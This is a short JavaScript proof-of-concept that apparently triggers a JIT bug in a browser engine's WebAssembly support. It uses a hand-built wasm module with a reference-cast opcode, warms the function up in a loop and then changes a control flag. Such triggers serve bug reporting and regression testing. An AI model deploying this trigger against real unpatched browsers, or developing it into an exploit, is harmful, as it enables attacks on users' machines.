const wasmCode = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x07, 0x01, 0x60,
    0x01, 0x6f, 0x01, 0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x08, 0x01, 0x04,
    0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00, 0x0a, 0x0b, 0x01, 0x09, 0x00, 0x20,
    0x00, 0xfb, 0x18, 0x72, 0x1a, 0x41, 0x2a, 0x0b
]);

let flag = false;

function poc(f) {
    if (flag) {
        try {
            f(null);
        } catch (e) {}
    } else {
        try {
            f(null);
        } catch (e) {}
    }
}

try {
    const wasmModule = new WebAssembly.Module(wasmCode);
    const wasmInstance = new WebAssembly.Instance(wasmModule, {});
    const main = wasmInstance.exports.main;

    for (let i = 0; i < 1000; i++) {
        poc(main);
    }

    flag = true;
    poc(main);
} catch (e) {}